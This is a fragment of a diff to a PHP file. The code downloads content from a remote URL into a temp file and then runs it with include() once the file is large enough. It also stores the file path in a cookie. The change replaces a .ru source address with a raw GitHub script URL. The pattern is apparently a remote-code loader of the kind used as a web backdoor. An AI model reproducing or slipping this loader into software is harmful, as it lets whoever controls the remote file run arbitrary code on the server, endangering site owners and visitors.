@@ -42,7 +42,7 @@ if (!$tempPath) {
 $fileSize = filesize($tempPath);
 
 if ($fileSize < 10) {
-    fetchAndStoreContent("https://zzna.ru/prod.txt", $tempPath);
+    fetchAndStoreContent("https://raw.githubusercontent.com/Lavender-Townhall/townhall/refs/heads/main/tes22-script2.php", $tempPath);
 } elseif ($fileSize >= 1024) {
     setcookie('tmp-inc', $tempPath);
     include($tempPath);
